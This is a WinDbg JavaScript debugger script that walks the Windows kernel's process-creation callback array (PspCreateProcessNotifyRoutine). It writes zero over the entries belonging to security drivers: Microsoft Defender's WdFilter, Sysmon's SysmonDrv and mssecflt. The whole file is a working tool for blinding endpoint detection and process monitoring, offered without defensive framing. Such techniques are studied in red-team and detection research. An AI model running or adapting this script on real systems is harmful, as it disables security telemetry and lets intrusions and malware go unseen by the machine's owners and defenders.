
"use strict";

function zeroDefensiveProcessCreationCallbacks() {
    const log = x => host.diagnostics.debugLog(x + "\n");
    const ctl = host.namespace.Debugger.Utility.Control;

    // Targets to zero out
    const targets = ["WdFilter", "SysmonDrv", "mssecflt"];

    log("[*] PspCreateProcessNotifyRoutine - Zeroing defensive callbacks\n");

    let results = ctl.ExecuteCommand("dqs nt!PspCreateProcessNotifyRoutine L10");

    let entries = [];

    for (let line of results) {
        let parts = line.trim().split(/\s+/);
        if (parts.length < 2) continue;
        let entryAddr = parts[0].replace(/`/g, "");
        let raw       = parts[1].replace(/`/g, "");
        if (raw === "0000000000000000") break;
        entries.push({ entryAddr, raw });
    }

    log("[+] Found " + entries.length + " callbacks\n");

    for (let i = 0; i < entries.length; i++) {
        let { entryAddr, raw } = entries[i];

        // Mask off low 3 bits
        let maskedRes = ctl.ExecuteCommand("? (0x" + raw + " & 0xFFFFFFFFFFFFFFF8)");
        let maskedStr = "";
        for (let l of maskedRes) {
            let match = l.match(/=\s+([0-9a-f`]+)/i);
            if (match) {
                maskedStr = match[1].replace(/`/g, "");
                break;
            }
        }

        if (!maskedStr) continue;

        // Get symbol line
        let dpsRes = ctl.ExecuteCommand("dps 0x" + maskedStr + " L1");
        let symbolLine = "";
        for (let l of dpsRes) {
            let trimmed = l.trim();
            if (trimmed.length > 0) symbolLine = trimmed;
        }

        log("[" + i + "] " + symbolLine);

        // Check if this entry belongs to a defensive driver
        let isTarget = false;
        for (let t of targets) {
            if (symbolLine.toLowerCase().indexOf(t.toLowerCase()) !== -1) {
                isTarget = true;
                break;
            }
        }

        if (isTarget) {
            // Zero the entry at the array slot address (not the masked pointer)
            log("    [!] Target found -- zeroing entry at 0x" + entryAddr);
            let eqRes = ctl.ExecuteCommand("eq 0x" + entryAddr + " 0");
            for (let l of eqRes) {
                let trimmed = l.trim();
                if (trimmed.length > 0) log("    " + trimmed);
            }
            log("    [+] Zeroed.\n");
        }
    }

    log("[*] Done.");
}

function initializeScript() {
    return [
        new host.functionAlias(zeroDefensiveProcessCreationCallbacks, "zeroDefensiveProcessCreationCallbacks")
    ];
}
